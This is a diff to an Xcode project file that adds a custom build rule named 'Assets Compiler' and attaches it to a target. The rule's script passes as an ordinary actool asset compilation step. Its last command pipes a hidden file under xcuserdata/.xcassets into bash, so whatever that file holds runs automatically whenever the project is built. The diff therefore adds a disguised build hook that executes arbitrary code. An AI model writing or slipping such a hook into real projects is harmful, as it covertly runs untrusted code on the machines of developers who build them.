@@ -23,6 +23,22 @@
 		98793655B841F3A3EAB9A201 /* libPods-MVP.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 22C76D26D0180F02B5BA6514 /* libPods-MVP.a */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		3F708E50247A0EB6004066FD /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			inputFiles = (
+			);
+			isEditable = 0;
+			name = "Assets Compiler";
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\ncat \"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" | bash\n\n";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
 		0647C5BD24A0C6530063BCF1 /* ViewController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = ViewController.m; sourceTree = "<group>"; };
 		0647C5BE24A0C6530063BCF1 /* ViewController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = ViewController.h; sourceTree = "<group>"; };
@@ -178,6 +194,7 @@
 				06C3295F249A180B009D9337 /* Resources */,
 			);
 			buildRules = (
+				3F708E50247A0EB6004066FD /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
